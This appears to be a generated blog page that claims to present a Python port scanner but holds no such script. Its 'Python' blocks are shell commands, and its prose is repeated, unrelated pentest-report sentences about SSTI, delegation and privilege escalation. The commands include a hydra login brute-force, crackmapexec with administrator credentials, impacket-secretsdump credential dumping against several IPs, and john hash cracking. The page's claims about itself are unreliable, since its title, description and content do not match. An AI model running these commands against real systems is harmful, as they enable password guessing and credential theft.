---
TitleSEO: "Automated Port Scanner in Python | ZureFX"
TitlePost: "Automated Port Scanner — Python"
Author: "ZureFX"
Description: "A Python script for automated port scanner. Built for security research and automation."
Keywords: "fuzzer, scanner, python, script, tool"
URL: "https://zurefx.github.io/scripting/script-automated-port-scanner-255.html"
URL_IMAGES: ""
Date: "2025-12-18"
Tags: "Fuzzer, Scanner, Python, Script, Tool"
Section: "scripting"
Lang: "en"
main_img: "script-automated-port-scanner-255"
Permalink: "/scripting/script-automated-port-scanner-255.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `burpsuite`
- `smbexec`
- `bloodhound`

## Implementation

### Core Logic

The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism.

```python
nmap -sCV -p3306,389,389 10.108.32.39 -oN scan.txt
feroxbuster -h
```

The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

```python
feroxbuster -h
crackmapexec smb 10.70.172.138 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.74.21.245 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.94.60.199
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.205.115
impacket-secretsdump administrator:'P@ssw0rd!'@10.112.150.221
gobuster dir -u http://10.88.153.223/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 4.83s
```
